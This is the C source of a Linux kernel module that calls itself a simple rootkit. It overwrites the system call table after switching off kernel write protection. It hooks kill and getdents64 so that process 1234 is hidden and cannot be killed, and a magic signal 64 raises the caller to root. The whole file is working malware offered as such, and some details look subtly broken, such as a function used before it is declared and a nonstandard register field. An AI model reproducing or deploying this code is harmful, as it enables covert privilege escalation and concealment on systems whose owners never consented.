#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>
#include <linux/dirent.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/signal.h>
#include <linux/sched.h>

unsigned long *__sys_call_table;

#ifdef CONFIG_X86_64
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1
#else
#endif
#endif

static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);

static int clean(void){
	printk(KERN_INFO "Cleaned\n");
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	return 0;
}

static asmlinkage long my_kill(const struct pt_regs *regs){
	pid_t pid = regs->di;
	int sig = regs->rsi;
	if(pid == 1234){
		printk(KERN_INFO "Attempt to kill hidden process, ignoring...\n");
		return 0;
	}
	if(sig == 64){
		give_root();
		printk(KERN_INFO "root is given\n");
	}
	return orig_kill(regs);
}

asmlinkage int my_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
	int ret = orig_getdents64(fd, dirp, count);
	struct linux_dirent64 *d;
	unsigned long offset = 0;

	while(offset < ret){
		d = (struct linux_dirent64 *)((char *)dirp + offset);
		if(strcmp(d->d_name, "1234") == 0){
			memmove(d, (char *)d + d->d_reclen, ret - offset - d->d_reclen);
			ret -= d->d_reclen;
		}else{
			offset += d->d_reclen;
		}
	}
	return ret;
}

static int hook(void){
	orig_kill = (void *)__sys_call_table[__NR_kill];
	orig_getdents64 = (void *)__sys_call_table[__NR_getdents64];
	__sys_call_table[__NR_kill] = (unsigned long)my_kill;
	__sys_call_table[__NR_getdents64] = (unsigned long)my_getdents64;
	printk(KERN_INFO "Syscalls hooked\n");
	return 0;
}

static int store(void){
#if PTREGS_SYSCALL_STUB
	printk(KERN_INFO "orig_kill table entry stored 0\n");
#else
	printk(KERN_INFO "orig_kill table entry stored 1\n");
#endif
	return 0;
}

unsigned long *get_sys_calltable(void){
	unsigned long *sys_calltable = NULL;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
	sys_calltable = (unsigned long *)kallsyms_lookup_name("sys_call_table");
#else
	return NULL;
#endif
	return sys_calltable;
}

static inline void write_cr0_forced(unsigned long val){
	unsigned long __force_order;
	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void){
	write_cr0_forced(read_cr0());
	printk(KERN_INFO "****** protected the memory ******\n");
}

static inline void unprotect_memory(void){
	write_cr0_forced(read_cr0() & ~0x00010000);
	printk(KERN_INFO "****** unprotected the memory ******\n");
}

static void give_root(void){
	struct cred *new_cred = prepare_kernel_cred(NULL);
	if(new_cred != NULL){
		new_cred->uid.val = 0;
		new_cred->gid.val = 0;
		new_cred->euid.val = 0;
		new_cred->egid.val = 0;
		commit_creds(new_cred);
		printk(KERN_INFO "Root privileges granted\n");
	}
}

static int __init m4lisio_init(void){
	printk(KERN_INFO "Rootkit: init\n");
	__sys_call_table = get_sys_calltable();
	if(!__sys_call_table){
		printk(KERN_INFO "Sys_call_table error\n");
		return -1;
	}
	if(store() == -1){
		printk(KERN_INFO "error: sys_call store err\n");
		return -1;
	}
	unprotect_memory();
	if(hook() == -1){
		printk(KERN_INFO "error: hook err\n");
		return -1;
	}
	protect_memory();
	return 0;
}

static void __exit m4lisio_exit(void){
	printk(KERN_INFO "Rootkit: exit\n");
	unprotect_memory();
	if(clean() == -1){
		printk(KERN_INFO "clean err\n");
	}
	protect_memory();
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("m4lisio");
MODULE_VERSION("0.0.2");
MODULE_DESCRIPTION("Simple LKM rootkit");

module_init(m4lisio_init);
module_exit(m4lisio_exit);
